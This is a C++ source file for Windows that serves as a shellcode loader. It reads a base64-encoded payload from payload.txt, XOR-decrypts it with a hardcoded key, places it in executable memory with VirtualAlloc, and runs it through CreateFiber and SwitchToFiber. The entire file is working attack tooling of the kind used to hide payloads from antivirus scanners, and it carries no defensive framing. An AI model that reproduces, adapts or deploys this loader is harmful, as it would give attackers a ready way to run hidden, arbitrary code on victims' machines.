#include <Windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib,"Crypt32.lib")


// key for XOR decrypt
char my_secret_key[] = "yourkeybro:)";

// decrypt deXOR function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int base64_decode(const char* encoded_string, char* decoded_data, int decoded_data_size)
{
    
    DWORD input_length = strlen(encoded_string);
    DWORD output_length = decoded_data_size;
    BOOL success = 
        CryptStringToBinaryA
        (
        encoded_string, input_length,
        CRYPT_STRING_BASE64, (BYTE*)decoded_data, &output_length, NULL, NULL
        );

    if (!success) {
        return -1;
    }

    return output_length;
}

int ReadPayload(char* &payload)
{
    HANDLE hFile = CreateFile(L"payload.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file\n");
        return 1;
    }

    // Get the file size
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) {
        printf("Error getting file size\n");
        CloseHandle(hFile);
        return 1;
    }

    // Allocate memory for the file data
    char* pData = new char[dwFileSize + 1];
    if (pData == NULL) {
        printf("Error allocating memory\n");
        CloseHandle(hFile);
        return 1;
    }

    // Read the file data into the buffer
    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, pData, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) {
        printf("Error reading file data\n");
        CloseHandle(hFile);
        delete[] pData;
        return 1;
    }

    // Null-terminate the buffer
    pData[dwFileSize] = '\0';
    
    // Close the file handle
    CloseHandle(hFile);
    payload = pData;

    return 0;
}

int main(void)
{

    char* my_payload;
    char* decoded_data;
    int decoded_len;
    // read payload via file
    ReadPayload(my_payload);
    { // decode base64 payload to binary
        //printf("payload : %s\n", my_payload);
        decoded_len = base64_decode(my_payload, NULL, 0);

        if (decoded_len < 0) {
            printf("Error decoding Base64 string.\n");
            return 1;
        }
        decoded_data = new char[decoded_len + 1]; // +1 for null terminator

        if (!decoded_data) {
            printf("Error allocating memory.");
            return 1;
        }
        decoded_len = base64_decode(my_payload, decoded_data, decoded_len);

        if (decoded_len < 0) {
            printf("Error decoding Base64 string.");
            delete[] decoded_data;
            return 1;
        }
    }
    //printf("decoded_data : %s\n", decoded_data);

    decoded_data[decoded_len] = '\0';

    ZeroMemory(my_payload, sizeof my_payload);
    delete[] my_payload;

    // convert the main thread to fiber
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    void* my_payload_mem; // memory buffer for payload

    // Decrypt (DeXOR) the payload
    XOR((char*)decoded_data, decoded_len, my_secret_key, sizeof(my_secret_key));

    my_payload_mem = VirtualAlloc(0, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(my_payload_mem, decoded_data, decoded_len);

    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)my_payload_mem, NULL);

    SwitchToFiber(shellcodeFiber);

    delete[] decoded_data;
    
    return 0;
}